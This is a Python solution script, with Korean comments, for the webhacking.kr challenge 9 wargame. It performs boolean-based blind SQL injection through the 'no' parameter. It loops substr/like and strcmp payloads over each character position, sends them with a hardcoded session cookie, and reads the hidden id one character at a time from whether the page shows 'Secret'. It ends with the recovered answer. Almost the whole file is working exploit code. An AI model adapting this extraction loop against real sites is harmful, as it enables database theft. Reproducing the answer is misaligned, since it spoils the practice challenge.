#http://webhacking.kr/challenge/web/web-09/index.php?no=1
'''
---설명---
no, 컬럼을 이용하여 blind sql injection 사용가능
no=if(length(id)like(11),3,0) 값을 넣으면 Secret 페이지로 넘어감
그럼 이제는 해당하는 문자열을 찾는 쿼리를 짜야함
no=if(substr(id,1~11,1)like(a-z),3,0)
'''

import urllib.request
import re

phpsessid='805defb40aabf56fc3bdc3336a183499'
pw=""
'''
#방법1
for i in range(1,12):
    for j in range(33,126):
        url="http://webhacking.kr/challenge/web/web-09/index.php?no="
        query="if(substr(id,"+str(i)+",1)like("+hex(j)+"),3,0)"
        req=urllib.request.Request(url+query)
        req.add_header('Cookie', "PHPSESSID=%s" % (phpsessid))
        html=urllib.request.urlopen(req).read().decode('ISO-8859-1')
        if re.findall("Secret",html):
            pw=pw+chr(j)
            print("id : %s" % pw)
            break

print("id %s" % pw)
'''
#방법2
for i in range(1,12):
    for j in range(33,126):
        url="http://webhacking.kr/challenge/web/web-09/index.php?no="
        query="if(strcmp(substr(id,"+str(i)+",1),"+hex(j)+"),0,3)"
        req=urllib.request.Request(url+query)
        req.add_header('Cookie', "PHPSESSID=%s" % (phpsessid))

        html=urllib.request.urlopen(req).read().decode('ISO-8859-1')
        if re.findall("Secret",html):
            pw=pw+chr(j)
            print("id : %s" % pw)
            break
print("id %s" % pw)

#pw= alsrkswhaql

